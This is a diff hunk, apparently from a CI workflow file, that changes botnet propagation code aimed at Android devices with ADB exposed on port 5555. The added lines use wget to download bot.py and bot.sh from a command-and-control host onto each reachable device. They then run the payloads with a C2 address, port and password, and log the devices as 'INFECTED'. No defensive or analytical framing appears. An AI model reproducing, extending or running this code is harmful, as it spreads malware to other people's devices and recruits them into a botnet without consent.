@@ -145,12 +145,17 @@ jobs:
                       r2 = subprocess.run(["adb", "-s", target, "shell", "id"],
                                           capture_output=True, text=True, timeout=10)
                       if "uid=" in r2.stdout:
-                          subprocess.run(["adb", "-s", target, "push",
-                                          "/tmp/bot.py", "/data/local/tmp/sshd"],
-                                         capture_output=True, timeout=12)
+                          # Try Python first, shell fallback for Android without Python
+                          bot_py = "/tmp/bot.py"
+                          bot_sh = "/tmp/bot.sh"
+                          # Download both payloads to device
                           subprocess.run(["adb", "-s", target, "shell",
-                                          f"python3 /data/local/tmp/sshd {C2} {CPORT} enibot2024 &"],
+                                          f"wget -q http://{C2}:{PPORT}/bot.py -O /data/local/tmp/bp 2>/dev/null; wget -q http://{C2}:{PPORT}/bot.sh -O /data/local/tmp/bs 2>/dev/null"],
                                          capture_output=True, timeout=10)
+                          # Try Python
+                          r3 = subprocess.run(["adb", "-s", target, "shell",
+                                              f"(python3 /data/local/tmp/bp {C2} {CPORT} enibot2024 &) || (sh /data/local/tmp/bs {C2} {CPORT} enibot2024 &)"],
+                                              capture_output=True, timeout=10)
                           subprocess.run(["adb", "disconnect", target], capture_output=True)
                           with lock: infected.append(f"ADB:{ip}")
                           sys.stderr.write(f"INFECTED ADB {ip}:5555\n")
